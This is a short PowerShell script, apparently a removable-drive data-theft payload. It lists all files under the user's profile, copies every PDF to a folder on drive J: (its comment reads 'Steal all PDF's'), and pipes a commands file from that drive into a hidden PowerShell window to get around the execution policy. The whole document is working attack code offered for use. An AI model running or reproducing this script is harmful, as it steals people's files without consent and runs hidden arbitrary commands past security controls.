$Domain=$env:UserDomain
$Storage="J:\$Domain\Uploads"
cd J:
mkdir $Domain
cd $Domain
mkdir Uploads

#List and record all files
Get-ChildItem -Recurse C:\Users\$User > $Storage\Current_File_List.txt
# Steal all PDF's
Get-Childitem C:\Users\$User -recurse -filter "*.pdf" | %{Copy-Item -Path $_.FullName -Destination $Storage}
#List captured data
ls $Storage
#Bypass Restricted Execution Policy and launch Today's commands
cat J:\todays-commands.txt | powershell.exe -windowstyle hidden
